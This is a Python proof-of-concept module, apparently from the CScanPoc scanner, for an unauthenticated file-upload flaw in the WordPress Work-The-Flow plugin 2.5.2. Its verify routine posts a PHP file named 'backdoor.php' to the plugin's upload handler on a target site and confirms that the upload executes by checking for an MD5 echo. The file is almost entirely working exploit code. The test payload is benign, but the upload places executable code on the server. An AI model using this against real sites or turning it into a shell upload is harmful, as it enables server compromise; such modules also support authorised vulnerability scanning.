# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0038'  # 平台漏洞编号，留空
    name = 'WordPress Work-The-Flow Plugin 2.5.2 文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-04-05'  # 漏洞公布时间
    desc = '''
        WordPress Work-The-Flow Plugin 2.5.2 文件上传漏洞。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36640/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Work-The-Flow Plugin 2.5.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1cf28387-449e-4623-977f-192e406093b1'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            path = "/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php"
            payload = '{target}'.format(target=self.target) + path
            filename = {
                "Content-Disposition": "backdoor.php"
            }
            shell = "<?php echo md5(123)?>"
            req = requests.post(payload, headers=filename, data=shell)

            if req.status_code == 200 and '202cb962ac59075b964b07152d234b70' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
